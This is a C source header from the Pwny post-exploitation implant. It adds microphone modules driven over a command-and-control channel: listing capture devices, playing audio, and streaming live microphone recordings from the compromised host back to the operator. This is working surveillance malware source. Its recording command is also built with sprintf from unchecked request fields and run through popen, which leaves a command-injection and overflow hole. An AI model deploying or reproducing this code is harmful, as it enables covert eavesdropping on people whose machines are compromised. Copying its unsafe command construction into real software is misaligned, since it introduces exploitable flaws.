/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _MIC_H_
#define _MIC_H_

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define MIC_BASE 6

#define MIC_PLAY \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       MIC_BASE, \
                       API_CALL)
#define MIC_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       MIC_BASE, \
                       API_CALL + 1)

#define MIC_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        MIC_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_MIC_ID   TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE)
#define TLV_TYPE_RATE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE + 1)
#define TLV_TYPE_CHANNELS TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE + 2)

#define TLV_TYPE_FORMAT   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, MIC_BASE, API_TYPE)

static tlv_pkt_t *mic_play(c2_t *c2)
{
    int size;
    FILE *fp;
    unsigned char *buffer;

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &buffer);
    fp = popen("aplay -q", "w");

    if (fp == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (fwrite(buffer, 1, size, fp) != size)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pclose(fp);
    free(buffer);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *mic_list(c2_t *c2)
{
    FILE *pcm;

    char *device;
    tlv_pkt_t *result;

    size_t length;
    ssize_t bytes_read;

    if ((pcm = fopen("/proc/asound/pcm", "r")) == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    while ((bytes_read = getline(&device, &length, pcm)) != -1)
    {
        if (strstr(device, "capture") != NULL)
        {
            tlv_pkt_add_string(result, TLV_TYPE_STRING, device);
        }
    }

    return result;
}

static int mic_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    int channels;
    int rate;

    FILE *handle;

    char command[100];
    char format[8];

    tlv_pkt_get_u32(c2->request, TLV_TYPE_MIC_ID, &device);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_CHANNELS, &channels);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_RATE, &rate);

    tlv_pkt_get_string(c2->request, TLV_TYPE_FORMAT, format);
    sprintf(command, "arecord -D plughw:%d -q -f %s -t raw -r %d -c %d",
            device, format, rate, channels);

    handle = popen(command, "r");
    if (handle == NULL)
    {
        return -1;
    }

    pipe->data = handle;
    return 0;
}

static int mic_read(pipe_t *pipe, void *buffer, int length)
{
    FILE *handle;

    handle = pipe->data;
    return fread(buffer, 1, length, handle);
}

static int mic_destroy(pipe_t *pipe, c2_t *c2)
{
    FILE *handle;

    handle = pipe->data;
    pclose(handle);

    return 0;
}

void register_mic_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, MIC_PLAY, mic_play);
    api_call_register(api_calls, MIC_LIST, mic_list);
}

void register_mic_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    callbacks.create_cb = mic_create;
    callbacks.read_cb = mic_read;
    callbacks.destroy_cb = mic_destroy;

    api_pipe_register(pipes, MIC_PIPE, callbacks);
}

#endif
